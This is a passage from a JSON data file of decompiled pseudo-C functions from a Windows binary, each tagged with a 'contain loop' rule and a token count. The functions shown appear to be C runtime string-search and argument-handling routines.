        "decompiled_code": "\nuint fcn.0048aebd(uint8_t *param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*param_1 & 0x80) != 0 && ((*param_2 & 0x10) != 0))))\n    {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(param_2 + 4)) {\n            puVar3 = *(param_2 + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x0048a56e:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x0048a573;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x0048a56e;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x0048a573:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&\n           ((((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)) && (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 528
    },
    "004ab4b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.004ab4b4(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char **ppcVar10;\n    char **arg_8h;\n    char **ppcStack44;\n    char **ppcStack40;\n    uint uStack36;\n    char **ppcStack32;\n    char *pcStack28;\n    char *pcStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char **ppcStack12;\n    uint uStack8;\n    \n    if (param_2 == NULL) {\n        puVar3 = fcn.00403a35();\n        iVar8 = 0x16;\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        pcVar7 = NULL;\n        *param_2 = 0;\n        iVar8 = *param_1;\n        ppcStack44 = NULL;\n        ppcStack40 = NULL;\n        uStack36 = 0;\n        ppcVar10 = ppcStack44;\n        while (ppcStack44 = ppcVar10,  iVar8 != 0) {\n            uStack8 = CONCAT13(uStack8 >> 0x18, 0x3f2a);\n            iVar8 = fcn.00402b58(iVar8, &uStack8);\n            if (iVar8 == 0) {\n                iVar8 = fcn.004c6bf6(*param_1, 0, 0, &ppcStack44);\n            }\n            else {\n                iVar8 = fcn.004c6db4(*param_1, iVar8, &ppcStack44);\n            }\n            ppcVar10 = ppcStack44;\n            ppcStack12 = iVar8;\n            if (iVar8 != 0) goto code_r0x004c687a;\n            param_1 = param_1 + 1;\n            iVar8 = *param_1;\n        }\n        uStack8 = NULL;\n        pcStack16 = (ppcStack40 - ppcVar10 >> 2) + 1;\n        uVar9 = ~-(ppcStack40 < ppcVar10) & (ppcStack40 - ppcVar10) + 3U >> 2;\n        ppcStack12 = ppcVar10;\n        if (uVar9 != 0) {\n            uVar6 = 0;\n            do {\n                pcVar5 = *ppcStack12;\n                pcStack20 = pcVar5 + 1;\n                do {\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n                pcVar7 = pcVar5 + pcVar7 + (1 - pcStack20);\n                ppcStack12 = ppcStack12 + 1;\n                uVar6 = uVar6 + 1;\n                uStack8 = pcVar7;\n            } while (uVar6 != uVar9);\n        }\n        iVar8 = fcn.00405fa6(pcStack16, uStack8, 1);\n        if (iVar8 == 0) {\n            iVar8 = -1;\n            ppcStack12 = 0xffffffff;\n        }\n        else {\n            pcStack16 = iVar8 + pcStack16 * 4;\n            pcStack28 = pcStack16;\n            if (ppcVar10 != ppcStack40) {\n                ppcStack32 = iVar8 - ppcVar10;\n                ppcStack12 = ppcVar10;\n                do {\n                    pcStack24 = *ppcStack12;\n                    pcStack20 = pcStack24;\n                    do {\n                        cVar1 = *pcStack20;\n                        pcStack20 = pcStack20 + 1;\n                    } while (cVar1 != '\\0');\n                    pcStack20 = pcStack20 + (1 - (pcStack24 + 1));\n                    iVar4 = fcn.00402a04(pcStack16, uStack8 + (pcStack28 - pcStack16), pcStack24, pcStack20);\n                    if (iVar4 != 0) {\n                        fcn.0040366b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar8 = (*pcVar2)();\n                        return iVar8;\n                    }\n                    *(ppcStack32 + ppcStack12) = pcStack16;\n                    ppcStack12 = ppcStack12 + 1;\n                    pcStack16 = pcStack16 + pcStack20;\n                } while (ppcStack12 != ppcStack40);\n            }\n            ppcStack12 = NULL;\n            *param_2 = iVar8;\n            iVar8 = 0;\n        }\n        fcn.0040640b(0);\ncode_r0x004c687a:\n        uVar6 = 0;\n        uVar9 = ~-(ppcStack40 < ppcVar10) & ppcStack40 + (3 - ppcVar10) >> 2;\n        arg_8h = ppcVar10;\n        ppcStack32 = ppcVar10;\n        pcStack28 = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.0040640b(*ppcVar10);\n                uVar6 = uVar6 + 1;\n                ppcVar10 = ppcVar10 + 1;\n                iVar8 = ppcStack12;\n                arg_8h = ppcStack44;\n            } while (uVar6 != uVar9);\n        }\n        fcn.0040640b(arg_8h);\n    }\n    return iVar8;\n}\n",
        "token_count": 1314
    },
    "004ab4c1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004ab4c1(int16_t **param_1, int16_t **param_2)\n\n{\n    int16_t iVar1;\n    int16_t *arg_10h;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int16_t **ppiVar8;\n    int16_t **arg_8h;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *in_stack_ffffffc8;\n    int16_t **ppiStack48;\n    int16_t **ppiStack44;\n    uint uStack40;\n    int16_t **ppiStack36;\n    int16_t *piStack32;\n    int16_t *piStack28;\n    int16_t **ppiStack24;\n    int32_t iStack20;\n    uint32_t uStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    ppiStack36 = param_2;\n    ppiStack24 = param_1;\n    if (param_2 == NULL) {\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        uVar10 = 0;\n        *param_2 = NULL;\n        piVar5 = *param_1;\n        ppiStack48 = NULL;\n        ppiStack44 = NULL;\n        uStack40 = 0;\n        ppiVar8 = ppiStack48;\n        while (ppiStack48 = ppiVar8,  piVar5 != NULL) {\n            uStack16 = 0x3f002a;\n            uStack12 = 0;\n            ppiStack24 = param_1;\n            iVar4 = fcn.00403963(piVar5, &uStack16);\n            if (iVar4 == 0) {\n                iStack20 = fcn.004c6cd3(*param_1, 0, 0, &ppiStack48);\n            }\n            else {\n                iStack20 = fcn.004c70a0(*param_1, iVar4, &ppiStack48);\n            }\n            ppiVar8 = ppiStack48;\n            if (iStack20 != 0) goto code_r0x004c6b13;\n            param_1 = ppiStack24 + 1;\n            piVar5 = *param_1;\n        }\n        iStack20 = 0;\n        piStack32 = (ppiStack44 - ppiVar8 >> 2) + 1;\n        uVar9 = ~-(ppiStack44 < ppiVar8) & (ppiStack44 - ppiVar8) + 3U >> 2;\n        ppiStack24 = ppiVar8;\n        if (uVar9 != 0) {\n            uVar7 = 0;\n            do {\n                piVar5 = *ppiStack24;\n                piStack28 = piVar5 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                iStack20 = iStack20 + 1 + (piVar5 - piStack28 >> 1);\n                ppiStack24 = ppiStack24 + 1;\n                uVar7 = uVar7 + 1;\n            } while (uVar7 != uVar9);\n        }\n        piVar5 = fcn.00405fa6(piStack32, iStack20, 2);\n        if (piVar5 == NULL) {\n            iStack20 = -1;\n        }\n        else {\n            piStack32 = piVar5 + piStack32 * 2;\n            in_stack_ffffffc8 = piStack32;\n            ppiStack24 = ppiVar8;\n            if (ppiVar8 != ppiStack44) {\n                uStack16 = piVar5 - ppiVar8;\n                do {\n                    arg_10h = *ppiStack24;\n                    piVar6 = arg_10h;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != 0);\n                    piStack28 = (piVar6 - (arg_10h + 1) >> 1) + 1;\n                    iVar4 = fcn.00405b64(piStack32, iStack20 - (piStack32 - in_stack_ffffffc8 >> 1), arg_10h, piStack28)\n                    ;\n                    if (iVar4 != 0) {\n                        fcn.0040366b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    *(uStack16 + ppiStack24) = piStack32;\n                    ppiStack24 = ppiStack24 + 1;\n                    piStack32 = piStack32 + piStack28;\n                } while (ppiStack24 != ppiStack44);\n            }\n            iStack20 = 0;\n            *ppiStack36 = piVar5;\n        }\n        fcn.0040640b(0);\ncode_r0x004c6b13:\n        uVar9 = ~-(ppiStack44 < ppiVar8) & ppiStack44 + (3 - ppiVar8) >> 2;\n        arg_8h = ppiVar8;\n        ppiStack36 = ppiVar8;\n        uStack16 = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.0040640b(*ppiVar8);\n                uVar10 = uVar10 + 1;\n                ppiVar8 = ppiVar8 + 1;\n                arg_8h = ppiStack48;\n            } while (uVar10 != uVar9);\n        }\n        fcn.0040640b(arg_8h);\n    }\n    fcn.004030bc(in_stack_ffffffc8);\n    return;\n}\n",
        "token_count": 1378
    },
    "004c5823": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.004c5823(uchar (*param_1) [16], uint8_t param_2)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar (*pauVar4) [16];\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar (*pauVar7) [16];\n    char *pcVar8;\n    uint8_t *puVar9;\n    uchar auVar11 [16];\n    uchar auVar13 [16];\n    char cVar16;\n    char cVar17;\n    char cVar18;\n    char cVar19;\n    char cVar20;\n    char cVar21;\n    char cVar22;\n    uchar auVar15 [16];\n    uint8_t *puVar10;\n    uint8_t uVar12;\n    uint8_t uVar14;\n    \n    if (*0x573c4c != 0) {\n        if (*0x573c4c < 2) {\n            auVar15 = pshuflw(ZEXT216(CONCAT11(param_2, param_2)), ZEXT216(CONCAT11(param_2, param_2)), 0);\n            uVar3 = -1 << (param_1 & 0xf);\n            pcVar8 = param_1 - (param_1 & 0xf);\n            pauVar7 = NULL;\n            while( true ) {\n                uVar14 = -(pcVar8[0xf] == '\\0');\n                auVar13 = CONCAT115(uVar14, CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                                      CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                                CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                                          CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                                    CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        '\\0'), CONCAT18(\n                                                            -(pcVar8[8] == '\\0'), \n                                                            CONCAT17(-(pcVar8[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar8[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0')))\n                                                            )))))))))))));\n                cVar16 = SUB161(auVar15 >> 8, 0);\n                cVar17 = SUB161(auVar15 >> 0x10, 0);\n                cVar18 = SUB161(auVar15 >> 0x18, 0);\n                cVar19 = SUB161(auVar15 >> 0x20, 0);\n                cVar20 = SUB161(auVar15 >> 0x28, 0);\n                cVar21 = SUB161(auVar15 >> 0x30, 0);\n                cVar22 = SUB161(auVar15 >> 0x38, 0);\n                uVar12 = -(pcVar8[0xf] == cVar22);\n                auVar11 = CONCAT115(uVar12, CONCAT114(-(pcVar8[0xe] == cVar21), \n                                                      CONCAT113(-(pcVar8[0xd] == cVar20), \n                                                                CONCAT112(-(pcVar8[0xc] == cVar19), \n                                                                          CONCAT111(-(pcVar8[0xb] == cVar18), \n                                                                                    CONCAT110(-(pcVar8[10] == cVar17), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        cVar16), \n                                                                                                       CONCAT18(-(pcVar8\n                                                            [8] == SUB161(auVar15, 0)), \n                                                            CONCAT17(-(pcVar8[7] == cVar22), \n                                                                     CONCAT16(-(pcVar8[6] == cVar21), \n                                                                              CONCAT15(-(pcVar8[5] == cVar20), \n                                                                                       CONCAT14(-(pcVar8[4] == cVar19), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          cVar18), \n                                                                                                         CONCAT12(-(\n                                                            pcVar8[2] == cVar17), \n                                                            CONCAT11(-(pcVar8[1] == cVar16), \n                                                                     -(*pcVar8 == SUB161(auVar15, 0)))))))))))))))));\n                uVar5 = (SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar13 >> 0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar14 >> 7) << 0xf) & uVar3;\n                if (uVar5 != 0) break;\n                uVar3 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n                iVar6 = 0x1f;\n                if (uVar3 != 0) {\n                    for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                    }\n                }\n                if (uVar3 != 0) {\n                    pauVar7 = pcVar8 + iVar6;\n                }\n                uVar3 = 0xffffffff;\n                pcVar8 = pcVar8 + 0x10;\n            }\n            uVar3 = (uVar5 * 2 & uVar5 * -2) - 1 &\n                    (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n            iVar6 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            pauVar4 = pcVar8 + iVar6;\n            if (uVar3 == 0) {\n                pauVar4 = pauVar7;\n            }\n            return pauVar4;\n        }\n        uVar3 = param_2;\n        if (uVar3 == 0) {\n            pcVar8 = param_1 & 0xfffffff0;\n            auVar15 = CONCAT115(-(pcVar8[0xf] == '\\0'), \n                                CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                          CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                    CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                              CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                        CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                  CONCAT19(-(pcVar8[9] == '\\0'), \n                                                                                           CONCAT18(-(pcVar8[8] == '\\0')\n                                                                                                    , CONCAT17(-(pcVar8[\n                                                            7] == '\\0'), \n                                                            CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar8[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0'))))))))))))\n                                                            ))));\n            uVar3 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(pcVar8[0xf] == '\\0') >> 7) << 0xf) &\n                    -1 << (param_1 & 0xf);\n            while (uVar3 == 0) {\n                pcVar1 = pcVar8 + 0x1f;\n                auVar15 = CONCAT115(-(*pcVar1 == '\\0'), \n                                    CONCAT114(-(pcVar8[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar8[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar8[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar8[0x1b] == '\\0'), \n                                                                            CONCAT110(-(pcVar8[0x1a] == '\\0'), \n                                                                                      CONCAT19(-(pcVar8[0x19] == '\\0'), \n                                                                                               CONCAT18(-(pcVar8[0x18]\n                                                                                                         == '\\0'), \n                                                                                                        CONCAT17(-(\n                                                            pcVar8[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar8[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar8[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar8[0x11] == '\\0'), -(pcVar8[0x10] == '\\0'))))\n                                                            ))))))))))));\n                pcVar8 = pcVar8 + 0x10;\n                uVar3 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(*pcVar1 == '\\0') >> 7) << 0xf;\n            }\n            iVar6 = 0;\n            if (uVar3 != 0) {\n                for (; (uVar3 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {\n                }\n            }\n            pauVar7 = pcVar8 + iVar6;\n        }\n        else {\n            pauVar7 = NULL;\n            uVar5 = param_1 & 0xf;\n            while (uVar5 != 0) {\n                if ((*param_1)[0] == uVar3) {\n                    pauVar7 = param_1;\n                }\n                if ((*param_1)[0] == 0) {\n                    return pauVar7;\n                }\n                param_1 = *param_1 + 1;\n                uVar5 = param_1 & 0xf;\n            }\n            do {\n                pauVar4 = param_1[1];\n                iVar6 = pcmpistri(ZEXT416(uVar3), *param_1, 0x40);\n                if (0xffffffef < param_1) {\n                    pauVar7 = pauVar4[-1] + iVar6;\n                }\n                param_1 = pauVar4;\n            } while (pauVar4 != NULL);\n        }\n        return pauVar7;\n    }\n    iVar6 = -1;\n    do {\n        pauVar7 = param_1;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        pauVar7 = *param_1 + 1;\n        puVar2 = *param_1;\n        param_1 = pauVar7;\n    } while (*puVar2 != '\\0');\n    iVar6 = -(iVar6 + 1);\n    puVar10 = pauVar7[-1] + 0xf;\n    do {\n        puVar9 = puVar10;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        puVar9 = puVar10 + -1;\n        uVar12 = *puVar10;\n        puVar10 = puVar9;\n    } while (param_2 != uVar12);\n    pauVar7 = puVar9 + 1;\n    if ((*pauVar7)[0] != param_2) {\n        pauVar7 = NULL;\n    }\n    return pauVar7;\n}\n",
        "token_count": 4331
    },
    "004c5bb2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004c5bb2(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffffec;\n    char acStack16 [8];\n    uint32_t uStack8;\n    \n    uStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_2 + 0xc) >> 0xc & 1) == 0) {\n        iVar1 = fcn.00406005(param_2);\n        iVar3 = 0x571f68;\n        if ((iVar1 == -1) || (iVar1 = fcn.00406005(param_2),  iVar1 == -2)) {\n            iVar1 = 0x571f68;\n        }\n        else {\n            iVar1 = fcn.00406005(param_2);\n            uVar2 = fcn.00406005(param_2);\n            iVar1 = *((iVar1 >> 6) * 4 + 0x575220) + (uVar2 & 0x3f) * 0x38;\n        }\n        if ((*(iVar1 + 0x29) != '\\x02') && (*(iVar1 + 0x29) != '\\x01')) {\n            iVar1 = fcn.00406005(param_2);\n            if ((iVar1 != -1) && (iVar1 = fcn.00406005(param_2),  iVar1 != -2)) {\n                iVar1 = fcn.00406005(param_2);\n                uVar2 = fcn.00406005(param_2);\n                iVar3 = *((iVar1 >> 6) * 4 + 0x575220) + (uVar2 & 0x3f) * 0x38;\n            }\n            if (*(iVar3 + 0x28) < '\\0') {\n                iVar1 = fcn.00402abd(&stack0xffffffec, acStack16, 5, param_1);\n                if ((iVar1 == 0) && (iVar1 = 0,  0 < in_stack_ffffffec)) {\n                    do {\n                        iVar3 = fcn.00404705(acStack16[iVar1], param_2);\n                        if (iVar3 == -1) break;\n                        iVar1 = iVar1 + 1;\n                    } while (iVar1 < in_stack_ffffffec);\n                }\n                goto code_r0x004c5b3b;\n            }\n        }\n        fcn.004c59e3(param_1, param_2);\n    }\n    else {\n        fcn.004c59e3(param_1, param_2);\n    }\ncode_r0x004c5b3b:\n    fcn.004030bc(in_stack_ffffffec);\n    return;\n}\n",
        "token_count": 623
    },
    "004c7975": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint8_t * fcn.004c7975(uint8_t *param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *param_2,  uVar1 != 0; param_2 = param_2 + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    do {\n        puVar3 = param_1;\n        puVar2 = *puVar3;\n        if (*puVar3 == 0) {\n            return puVar2;\n        }\n        param_1 = puVar3 + 1;\n    } while ((*(&uStack40 + (puVar2 >> 3)) >> (puVar2 & 7) & 1) == 0);\n    return puVar3;\n}\n",
        "token_count": 338
    },
    "004c7982": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.004c7982(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    \n    if (*param_1 != 0) {\n        do {\n            if (*param_2 != 0) {\n                iVar1 = *param_1;\n                piVar3 = param_2;\n                iVar2 = *param_2;\n                do {\n                    if (iVar2 == iVar1) {\n                        return param_1;\n                    }\n                    piVar3 = piVar3 + 1;\n                    iVar2 = *piVar3;\n                    iVar1 = *param_1;\n                } while (iVar2 != 0);\n            }\n            param_1 = param_1 + 1;\n        } while (*param_1 != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 198
    },
    "004c9a24": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.004c9a24(uint32_t *param_1, char param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uchar auVar8 [16];\n    char cVar10;\n    char cVar11;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    char cVar15;\n    char cVar16;\n    uchar auVar9 [16];\n    \n    if (*0x573c4c != 0) {\n        auVar9 = pshuflw(ZEXT216(CONCAT11(param_2, param_2)), ZEXT216(CONCAT11(param_2, param_2)), 0);\n        uVar3 = -1 << (param_1 & 0xf);\n        pcVar7 = param_1 - (param_1 & 0xf);\n        while( true ) {\n            cVar2 = SUB161(auVar9, 0);\n            cVar10 = SUB161(auVar9 >> 8, 0);\n            cVar11 = SUB161(auVar9 >> 0x10, 0);\n            cVar12 = SUB161(auVar9 >> 0x18, 0);\n            cVar13 = SUB161(auVar9 >> 0x20, 0);\n            cVar14 = SUB161(auVar9 >> 0x28, 0);\n            cVar15 = SUB161(auVar9 >> 0x30, 0);\n            cVar16 = SUB161(auVar9 >> 0x38, 0);\n            auVar8 = CONCAT115(-(pcVar7[0xf] == '\\0'), \n                               CONCAT114(-(pcVar7[0xe] == '\\0'), \n                                         CONCAT113(-(pcVar7[0xd] == '\\0'), \n                                                   CONCAT112(-(pcVar7[0xc] == '\\0'), \n                                                             CONCAT111(-(pcVar7[0xb] == '\\0'), \n                                                                       CONCAT110(-(pcVar7[10] == '\\0'), \n                                                                                 CONCAT19(-(pcVar7[9] == '\\0'), \n                                                                                          CONCAT18(-(pcVar7[8] == '\\0')\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == '\\0'), \n                                                            CONCAT16(-(pcVar7[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar7[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar7[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar7[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar7[1] == '\\0'), -(*pcVar7 == '\\0'))))))))))))\n                                                            )))) |\n                     CONCAT115(-(pcVar7[0xf] == cVar16), \n                               CONCAT114(-(pcVar7[0xe] == cVar15), \n                                         CONCAT113(-(pcVar7[0xd] == cVar14), \n                                                   